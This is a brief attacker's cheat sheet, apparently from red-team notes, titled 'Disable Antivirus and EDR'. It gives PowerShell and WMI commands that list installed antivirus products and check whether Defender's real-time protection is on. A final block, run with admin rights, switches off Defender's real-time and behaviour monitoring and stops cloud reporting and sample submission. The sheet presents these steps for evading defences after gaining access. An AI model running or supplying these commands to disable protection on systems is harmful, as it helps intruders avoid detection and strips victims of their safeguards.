# Disable Antivirus and EDR

## Check for Antivirus
```
wmic /namespace:\\root\securitycenter2 path antivirusproduct
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
Get-Service WinDefend
```

## Is RealTimeProtectionEnabled
```
Get-MpComputerStatus | select RealTimeProtectionEnabled
```

## Disable Defender and AV (Elevate to Admin)
```
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent NeverSend
```